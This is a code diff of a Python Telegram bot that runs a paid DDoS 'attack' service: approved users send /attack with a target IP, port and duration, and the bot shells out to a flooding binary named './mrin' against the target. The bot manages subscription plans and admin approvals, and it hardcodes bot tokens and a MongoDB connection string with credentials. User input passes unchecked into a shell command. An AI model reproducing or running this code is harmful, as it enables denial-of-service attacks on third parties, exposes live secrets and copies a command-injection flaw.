@@ -1,259 +1,220 @@
-import os
-import telebot
-import json
-import requests
-import logging
-import time
-from pymongo import MongoClient
-from datetime import datetime, timedelta
-import certifi
 import asyncio
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
-from threading import Thread
+import datetime
+from telegram import Update
+from telegram.ext import Application, CommandHandler, CallbackContext
 
-loop = asyncio.get_event_loop()
-
-TOKEN = '7275048595:AAEUmiY1AYw7bWyy2EvaETdpfTMdinhhpNg'
-user_id =("1202212810")
-MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
-FORWARD_CHANNEL_ID = -1002026175994
-CHANNEL_ID = -1002026175994
-error_channel_id = -1002026175994
-
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-
-client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['zoya']
-users_collection = db.users
-
-bot = telebot.TeleBot(TOKEN)
-REQUEST_INTERVAL = 1
-
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
-
-running_processes = []
+TELEGRAM_BOT_TOKEN = '7580203890:AAFiOEC7jHmf9jfqy7vzf5jRh65S2V67pj0'
+ADMIN_USER_IDS = {1066744659, 7383077317, 8159441634, 6265999727, 482756202, 6240348610, 1253267234, 1583238165, 1202212810, 6140583954}  # Add your admin IDs here as a set
+USERS_FILE = 'users.txt'
+LOG_FILE = 'log.txt'
+attack_in_progress = False
+users = set()
+user_approval_expiry = {}
 
 
-REMOTE_HOST = '4.213.71.147'  
-async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./mrin {target_ip} {target_port} {duration} 1800 "
+def load_users():
     try:
-       
+        with open(USERS_FILE) as f:
+            return set(line.strip() for line in f)
+    except FileNotFoundError:
+        return set()
+
+
+def save_users(users):
+    with open(USERS_FILE, 'w') as f:
+        f.writelines(f"{user}\n" for user in users)
+
+
+def log_command(user_id, target, port, duration):
+    with open(LOG_FILE, 'a') as f:
+        f.write(f"UserID: {user_id} | Target: {target} | Port: {port} | Duration: {duration} | Timestamp: {datetime.datetime.now()}\n")
+
+
+def clear_logs():
+    try:
+        with open(LOG_FILE, 'r+') as f:
+            if f.read().strip():
+                f.truncate(0)
+                return "*✅ Logs cleared successfully.*"
+            else:
+                return "*⚠️ No logs found.*"
+    except FileNotFoundError:
+        return "*⚠️ No logs file found.*"
+
+
+def set_approval_expiry_date(user_id, duration, time_unit):
+    current_time = datetime.datetime.now()
+    if time_unit in ["hour", "hours"]:
+        expiry_date = current_time + datetime.timedelta(hours=duration)
+    elif time_unit in ["day", "days"]:
+        expiry_date = current_time + datetime.timedelta(days=duration)
+    elif time_unit in ["week", "weeks"]:
+        expiry_date = current_time + datetime.timedelta(weeks=duration)
+    elif time_unit in ["month", "months"]:
+        expiry_date = current_time + datetime.timedelta(days=30 * duration)
+    else:
+        return False
+    user_approval_expiry[user_id] = expiry_date
+    return True
+
+
+def get_remaining_approval_time(user_id):
+    expiry_date = user_approval_expiry.get(user_id)
+    if expiry_date:
+        remaining_time = expiry_date - datetime.datetime.now()
+        return str(remaining_time) if remaining_time.total_seconds() > 0 else "Expired"
+    return "N/A"
+
+
+async def start(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    message = (
+        "*❤️Welcome to the 99-OFFZONE Testing DDOS ❤️*\n\n"
+        "*Use /attack <ip> <port> <duration>*\n"
+        "* @insanoic & @Vaibhav264  :- use karo *"
+    )
+    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+
+
+async def add_user(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    
+    if user_id not in ADMIN_USER_IDS:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are not authorized to use this command.*", parse_mode='Markdown')
+        return
+
+    args = context.args
+    if len(args) < 2:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add <user_id> <duration><time_unit>*\nExample: /add 12345 30days", parse_mode='Markdown')
+        return
+
+    user_to_add = args[0]
+    duration_str = args[1]
+
+    try:
+        duration = int(duration_str[:-4])
+        time_unit = duration_str[-4:].lower()
+        if set_approval_expiry_date(user_to_add, duration, time_unit):
+            users.add(user_to_add)
+            save_users(users)
+            expiry_date = user_approval_expiry[user_to_add]
+            response = f"*✔️ User {user_to_add} added successfully.*\nAccess expires on: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}."
+        else:
+            response = "*⚠️ Invalid time unit. Use 'hours', 'days', 'weeks', or 'months'.*"
+    except ValueError:
+        response = "*⚠️ Invalid duration format.*"
+
+    await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
+
+
+async def view_logs(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    
+    if user_id not in ADMIN_USER_IDS:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Unauthorized access.*", parse_mode='Markdown')
+        return
+    
+    try:
+        with open(LOG_FILE, 'r') as f:
+            logs = f.read().strip() or "*No logs available.*"
+    except FileNotFoundError:
+        logs = "*No logs available.*"
+
+    await context.bot.send_message(chat_id=chat_id, text=f"*Logs:*\n\n{logs}", parse_mode='Markdown')
+
+
+async def clear_logs_command(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    
+    if user_id not in ADMIN_USER_IDS:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Unauthorized access.*", parse_mode='Markdown')
+        return
+    
+    response = clear_logs()
+    await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
+
+
+async def run_attack(chat_id, ip, port, duration, context):
+    global attack_in_progress
+    attack_in_progress = True
+
+    try:
+        command = f"./mrin {ip} {port} {duration} 1800 "
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
-        running_processes.append(process)
         stdout, stderr = await process.communicate()
-        output = stdout.decode()
-        error = stderr.decode()
 
-        if output:
-            logging.info(f"Command output: {output}")
-        if error:
-            logging.error(f"Command error: {error}")
+        if stdout:
+            print(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            print(f"[stderr]\n{stderr.decode()}")
 
     except Exception as e:
-        logging.error(f"Failed to execute command on Codespace: {e}")
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
+
     finally:
-        if process in running_processes:
-            running_processes.remove(process)
+        attack_in_progress = False
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our bot!*", parse_mode='Markdown')
 
-async def start_asyncio_loop():
-    while True:
-        await asyncio.sleep(REQUEST_INTERVAL)
 
-async def run_attack_command_async(target_ip, target_port, duration):
-    await run_attack_command_on_codespace(target_ip, target_port, duration)
+async def attack(update: Update, context: CallbackContext):
+    global attack_in_progress
 
-def is_user_admin(user_id, chat_id):
-    try:
-        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
-    except:
-        return False
+    chat_id = update.effective_chat.id
+    user_id = str(update.effective_user.id)
+    args = context.args
 
-def check_user_approval(user_id):
-    user_data = users_collection.find_one({"user_id": user_id})
-    if user_data and user_data['plan'] > 0:
-        return True
-    return False
-
-def send_not_approved_message(chat_id):
-    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')
-
-@bot.message_handler(commands=['approve', 'disapprove'])
-def approve_or_disapprove_user(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-    is_admin = is_user_admin(user_id, CHANNEL_ID)
-    cmd_parts = message.text.split()
-
-    if not is_admin:
-        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
+    if user_id not in users or get_remaining_approval_time(user_id) == "Expired":
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need approval from @Vaibhav264 & @X9HYDRA or your access has expired.*", parse_mode='Markdown')
         return
 
-    if len(cmd_parts) < 2:
-        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
+    if attack_in_progress:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
         return
 
-    action = cmd_parts[0]
-    target_user_id = int(cmd_parts[1])
-    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
-    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
+    if len(args) != 3:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
+        return
 
-    if action == '/approve':
-        if plan == 1:
-            if users_collection.count_documents({"plan": 1}) >= 99:
-                bot.send_message(chat_id, "*Approval failed: .  limit reached (99 users).*", parse_mode='Markdown')
-                return
-        elif plan == 2: 
-            if users_collection.count_documents({"plan": 2}) >= 499:
-                bot.send_message(chat_id, "*Approval failed: Flooding Start  limit reached (499 users).*", parse_mode='Markdown')
-                return
-
-        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
-            upsert=True
-        )
-        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
-    else:  # disapprove
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
-            upsert=True
-        )
-        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"
-
-    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
-    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
-@bot.message_handler(commands=['Attack'])
-def attack_command(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-
+    ip, port, duration = args
     try:
-        user_data = users_collection.find_one({"user_id": user_id})
-        if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator.")
+        duration = int(duration)
+        if duration > 240:
+            response = "*⚠️ Error: Time interval must be less than or equal to  240 seconds.*"
+            await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
             return
+    except ValueError:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be a valid number.*", parse_mode='Markdown')
+        return
 
-        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
-            bot.send_message(chat_id, "Your . is currently not available due to limit reached.")
-            return
+    log_command(user_id, ip, port, duration)
 
-        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
-            bot.send_message(chat_id, "Your Flooding Start is currently not available due to limit reached.")
-            return
+    await context.bot.send_message(chat_id=chat_id, text=(
+        f"*⚔️ Attack Launched! ⚔️*\n"
+        f"*🎯 Target: {ip}:{port}*\n"
+        f"*🕒 Duration: {duration} seconds*\n"
+        f"*🔥 Join :- https://t.me/+W-EyOyO3lQUxNzE1💥*"
+    ), parse_mode='Markdown')
 
-        bot.send_message(chat_id, "Enter the target IP, port, and duration (in seconds) separated by spaces.")
-        bot.register_next_step_handler(message, process_attack_command)
-    except Exception as e:
-        logging.error(f"Error in attack command: {e}")
+    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
 
-@bot.message_handler(commands=['Attack'])
-def attack_command(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
 
-    try:
-        user_data = users_collection.find_one({"user_id": user_id})
-        if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator.*", parse_mode='Markdown')
-            return
+def main():
+    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("add", add_user))
+    application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("viewlogs", view_logs))
+    application.add_handler(CommandHandler("clearlogs", clear_logs_command))
+    application.run_polling()
 
-        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
-            bot.send_message(chat_id, "*Your .  is currently not available due to limit reached.*", parse_mode='Markdown')
-            return
 
-        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
-            bot.send_message(chat_id, "*Your Flooding Start  is currently not available due to limit reached.*", parse_mode='Markdown')
-            return
-
-        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
-        bot.register_next_step_handler(message, process_attack_command)
-    except Exception as e:
-        logging.error(f"Error in attack command: {e}")
-
-def process_attack_command(message):
-    try:
-        args = message.text.split()
-        if len(args) != 3:
-            bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
-            return
-        target_ip, target_port, duration = args[0], int(args[1]), args[2]
-
-        if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
-            return
-
-        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-        bot.send_message(message.chat.id, f"*Flooding parameters set :  {target_ip}:{target_port}:{duration}*\nAttack Running Dont put same ip port", parse_mode='Markdown')
-    except Exception as e:
-          logging.error(f"Error in processing attack command: {e}")
-
-def start_asyncio_thread():
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(start_asyncio_loop())
-
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    # Create a markup object
-    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-
-    # Create buttons
-    btn2 = KeyboardButton("FLOODING START 🔱")
-    btn3 = KeyboardButton("ATTACK STOP 🚀")
-    btn4 = KeyboardButton("MY ACCOUNT🥷")
-    btn6 = KeyboardButton("ADMIN ⛳")
-
-    # Add buttons to the markup
-    markup.add( btn2,btn3, btn4, btn6)
-
-    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')
-
-@bot.message_handler(func=lambda message: True)
-def handle_message(message):
-    if message.text == ".":
-       bot.reply_to(message, "*. selected*", parse_mode='Markdown')
-    elif message.text == "FLOODING START 🔱":
-        bot.reply_to(message, "*READY FOR ATTACK*", parse_mode='Markdown')
-        attack_command(message)
-
-    elif message.text == "ATTACK STOP 🚀":
-        bot.send_message(message.chat.id, "*/stop Coming Soon *", parse_mode='Markdown')
-    elif message.text == "MY ACCOUNT🥷":
-        user_id = message.from_user.id
-        user_data = users_collection.find_one({"user_id": user_id})
-        if user_data:
-            username = message.from_user.username
-            plan = user_data.get('plan', 'N/A')
-            valid_until = user_data.get('valid_until', 'N/A')
-            current_time = datetime.now().isoformat()
-            response = (f"*USERNAME: {username}\n"
-                        f"Plan: {plan}\n"
-                        f"Valid Until: {valid_until}\n"
-                        f"Current Time: {current_time}*")
-        else:
-            response = "*No account information found. Please contact the administrator.*"
-        bot.reply_to(message, response, parse_mode='Markdown')
-    elif message.text == "Help":
-        bot.reply_to(message, "*Help selected*", parse_mode='Markdown')
-    elif message.text == "ADMIN ⛳":
-        bot.reply_to(message, "*Contact admin = @insanoic*", parse_mode='Markdown')
-    else:
-        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
-
-if __name__ == "__main__":
-    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
-    asyncio_thread.start()
-    logging.info("Starting Codespace activity keeper and Telegram bot.\n FILE BY - @insanoic\n@insanoic\n@insanoic\n@insanoic\n@insanoic\n@insanoic\n@insanoic\n@insanoic")
-    while True:
-        try:
-            bot.polling(none_stop=True)
-        except Exception as e:
-            logging.error(f"An error occurred while polling: {e}")
-        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
-        time.sleep(REQUEST_INTERVAL)
+if __name__ == '__main__':
+    users = load_users()
+    main()
